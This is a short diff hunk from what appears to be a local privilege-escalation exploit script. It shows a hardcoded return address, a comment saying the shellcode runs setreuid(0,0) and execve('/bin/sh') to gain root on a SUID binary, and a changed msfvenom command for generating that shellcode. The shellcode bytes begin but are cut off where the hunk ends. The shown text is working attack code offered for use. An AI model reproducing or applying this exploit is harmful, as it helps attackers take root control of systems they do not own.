@@ -303,7 +303,7 @@ return_addr = struct.pack("<I", 0xbffffb04)
 # =========================================================
 # This shellcode executes: setreuid(0,0) + execve("/bin/sh")
 # When the binary has the SUID bit this allows us to become root
-# msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
+# msfvenom -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00'
 shellcode = (
 	"\xbe\xf3\xa9\xca\xf8\xd9\xf6\xd9\x74\x24\xf4\x5d"
 	"\x33\xc9\xb1\x0b\x31\x75\x15\x03\x75\x15\x83\xed"
